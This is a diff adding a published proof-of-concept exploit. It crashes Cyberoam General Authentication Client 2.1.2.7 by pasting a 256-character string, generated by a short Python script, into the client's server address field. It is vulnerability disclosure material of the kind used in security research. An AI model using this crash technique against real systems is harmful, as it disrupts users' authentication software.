@@ -1,0 +1,21 @@
+#Exploit Title: Cyberoam General Authentication Client 2.1.2.7 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-23
+#Vendor Homepage: https://www.cyberoam.com
+#Software Link: https://download.cyberoam.com/solution/optionals/i18n/Cyberoam%20General%20Authentication%20Client%202.1.2.7.zip
+#Tested Version: 2.1.2.7
+#Tested on: Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: cgac_2.1.2.7.py
+#2.- Open cgac_2.1.2.7.txt and copy content to clipboard
+#3.- Open Cyberoam General Authentication Client
+#4.- In "Server Address" field paste Clipboard
+#5.- Click on "Test"
+#6.- Crashed! 
+
+cod = "\x41" * 256
+
+f = open('cgac_2.1.2.7.txt', 'w')
+f.write(cod)
+f.close()
